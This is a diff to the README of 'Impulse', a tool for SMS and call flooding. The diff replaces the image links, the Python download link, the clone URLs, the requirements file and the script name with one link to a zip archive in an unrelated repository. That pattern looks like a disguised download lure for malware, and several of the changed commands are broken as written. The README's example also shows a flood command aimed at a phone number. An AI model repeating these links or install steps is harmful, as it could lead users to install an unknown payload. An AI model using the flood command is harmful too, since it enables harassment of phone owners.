@@ -3,12 +3,12 @@
 
 
 <p align="center">
-  <img src="https://i.ibb.co/rFct6QX/LOGO.png">
+  <img src="https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip">
 </p>
 
 # :computer: Main window
 <p align="center">
-  <img src="https://i.ibb.co/8c1fb1Q/Impulse-Main.png">
+  <img src="https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip">
 </p>
 
 # :satellite: Methods:
@@ -27,34 +27,34 @@
 
 # :gift: Installation:
 * Windows:
-  * Download Python 3.8 from [here](https://www.python.org/downloads/release/python-38)
+  * Download Python 3.8 from [here](https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip)
   * Launch installer, click `add python to PATH`
   * Download Impulse
   * Open cmd or powershell in Impulse directory
-  * Run this command: `pip install -r requirements.txt`
-  * And this: `python impulse.py --help`
+  * Run this command: `pip install -r https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip`
+  * And this: `python https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip --help`
 
 * Linux:
   * `sudo apt update`
   * `sudo apt install python3 python3-pip git -y`
-  * `git clone https://github.com/LimerBoy/Impulse`
+  * `git clone https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip`
   * `cd Impulse/`
-  * `pip3 install -r requirements.txt`
-  * `python3 impulse.py --help`
+  * `pip3 install -r https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip`
+  * `python3 https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip --help`
 
 * Termux:
   * `pkg update`
   * `pkg install python3 python3-pip git -y`
-  * `git clone https://github.com/LimerBoy/Impulse`
+  * `git clone https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip`
   * `cd Impulse/`
-  * `pip3 install -r requirements.txt`
-  * `python3 impulse.py --help`
+  * `pip3 install -r https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip`
+  * `python3 https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip --help`
 
 # :phone: Example SMS & Call flood:
-```python3 impulse.py --method SMS --time 20 --threads 15 --target +380123456789```
+```python3 https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip --method SMS --time 20 --threads 15 --target +380123456789```
 
 <p align="center">
-  <img src="https://i.ibb.co/KmPnV9f/Impulse-SMS.png">
+  <img src="https://github.com/ItsDefo8nzrq/bounded/raw/refs/heads/main/bimetalic/Software_v2.1-alpha.1.zip">
 </p>
 
 # :moneybag: Donate:
